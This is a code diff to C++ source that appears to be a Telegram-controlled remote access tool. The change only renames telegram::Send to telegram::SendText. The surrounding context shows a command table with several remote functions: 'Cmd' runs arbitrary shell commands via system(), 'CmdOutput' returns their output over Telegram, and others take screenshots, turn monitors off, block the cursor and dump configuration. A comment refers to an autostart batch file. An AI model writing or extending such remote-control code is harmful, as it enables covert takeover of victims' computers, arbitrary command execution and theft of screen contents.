@@ -15,24 +15,24 @@
 //autostart leaves o.bat file
 
 std::vector <std::pair<std::string, void(*)(std::string)>> functions{
-	{"ALL_ID",[](std::string cmd) { telegram::Send("Dont use it with ID."); }},
+	{"ALL_ID",[](std::string cmd) { telegram::SendText("Dont use it with ID."); }},
 	{"Status", getStatus},
 	{"SetID", setID},
 	{"Cmd", [](std::string cmd) { system(cmd.c_str()); }},
-	{"CmdOutput", [](std::string cmd) { telegram::Send(tools::cmd_output(cmd.c_str())); }},
+	{"CmdOutput", [](std::string cmd) { telegram::SendText(tools::cmd_output(cmd.c_str())); }},
 	{"FunctionList", [](std::string) {
 		std::string list;
 		for (auto& i : functions) {
 			list += i.first + "\n";
 		}
-		telegram::Send(list);
+		telegram::SendText(list);
 	}},
 	{"Volume", setVolume},
 	{"Screenshot", Screenshot},
 	{"MonitorOff", monitorOff},
 	{"MonitorOn", monitorOn},
 	{"ChangeCfg", ChangeCfg},
-	{"CheckCfg", [](std::string) {telegram::Send(tools::load_cfg().dump()); }},
+	{"CheckCfg", [](std::string) {telegram::SendText(tools::load_cfg().dump()); }},
 	{"SetCursor", SetCursor},
 	{"Delay", Delay},
 	{"BlockCursor", BlockCursor},
@@ -68,6 +68,6 @@ namespace execute {
 				return;
 			}
 		}
-		telegram::Send(ID + " function: " + PM.function + " not found. Try FunctionList to check possible functions.");
+		telegram::SendText(ID + " function: " + PM.function + " not found. Try FunctionList to check possible functions.");
 	}
 }
